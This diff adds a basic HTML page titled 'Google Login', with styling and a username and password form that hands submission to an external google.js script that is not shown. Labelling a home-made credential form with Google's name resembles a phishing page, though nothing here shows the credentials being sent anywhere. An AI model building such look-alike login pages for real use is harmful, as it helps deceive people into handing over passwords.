@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <style>
+        .container
+        {
+            width: 50%;
+            margin:auto;
+        }
+        .container > .design
+        {
+            border: 1px solid black;
+            width: 60%;
+            padding: 25px;
+            margin:auto;
+            margin-top: 10%;
+            margin-bottom: 10%;
+            height: 300px;
+            border-radius: 10px;
+        }
+         
+        .container > .design > form > p
+        {
+            color: rgb(117, 108, 108);
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .container > .design > form > input
+        {
+            width: 90%;
+            margin-top: 2%;
+            height: 40px;
+            text-align: center;
+            border: 1px solid gray;
+            border-radius: 24px;
+            outline: none;
+        }
+
+        #sub
+        {
+            margin-top: 10%;
+            width: 93%;
+            height: 50px;
+            background-color: green;
+            color: white;
+            border: none;
+            border-radius: 24px;
+        }
+       
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="text-align: center;font-family: sans-serif;">Google Login</h1>
+         <div class="design">
+             <form id="formSignup" onsubmit="login(event)">
+                 <p>Username : </p>
+                 <input type="text" placeholder="Username" id="username"/>
+                 <p>Password : </p>
+                 <input type="password" placeholder="Password" id="pass"/>
+                 <input type="submit" id="sub"/>
+            </form>
+         </div>
+    </div>
+</body>
+<script src="google.js"></script>
+</html>
